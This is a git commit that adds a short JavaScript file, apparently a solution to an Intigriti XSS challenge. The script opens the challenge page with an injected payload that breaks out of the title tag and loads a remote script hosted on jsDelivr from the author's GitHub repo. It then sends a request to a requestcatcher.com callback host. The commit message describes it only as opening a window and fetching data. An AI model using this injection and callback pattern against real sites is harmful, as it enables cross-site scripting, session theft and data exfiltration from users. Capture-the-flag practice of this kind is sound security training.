56cc024f51ca9f08258589c65f714f992195ded3
krishnasaren <112545071+krishnasaren@users.noreply.github.com>
2026-01-10 20:22:23 +0530

    Add script to open a new window and fetch data

---
+++ z.js
@@ -0,0 +1,6 @@
+(function () {
+    window.open("https://challenge-1023.intigriti.io/%3Cfont%20id=%22%3C&sol;title%3E%3Cscript%20src='https:&sol;&sol;cdn.jsdelivr.net&sol;gh&sol;krishnasaren&sol;amstig&sol;f.js'%20crossorigin='anonymous'%3E%3C&sol;script%3E%22%3E","_blank","width=800,height=600,resizable=yes,scrollbars=yes");
+  //window.open("https://challenge-1023.intigriti.io/%3Cfont%20id=%22%3C&sol;title%3E%3Cscript%20src='https:&sol;&sol;cdn.jsdelivr.net&sol;gh&sol;krishnasaren&sol;amstig&sol;p.js'%20crossorigin='anonymous'%3E%3C&sol;script%3E%22%3E","_blank","width=800,height=600,resizable=yes,scrollbars=yes");
+      
+  fetch("https://aab.requestcatcher.com/test?data=lorumEditedNew");
+})();
